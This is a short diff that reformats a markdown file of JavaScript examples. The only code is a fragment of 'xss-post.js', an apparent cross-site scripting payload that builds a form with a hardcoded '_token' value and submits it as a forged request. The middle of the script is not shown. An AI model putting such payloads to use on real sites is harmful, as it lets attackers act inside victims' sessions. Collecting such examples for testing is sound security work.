@@ -1,6 +1,7 @@
-xss-post.js
+# Javascrip examples
 
-"""
+**xss-post.js**:
+```
 async function submitRequest() {
   const data = new FormData();
   data.append('_token', 'ahj7AFQpyQvsbzG2anjdGfRput8465pLU1XPmQB3');
@@ -22,4 +23,4 @@ async function submitRequest() {
 
 submitRequest().catch(console.error)
 
-"""
+```
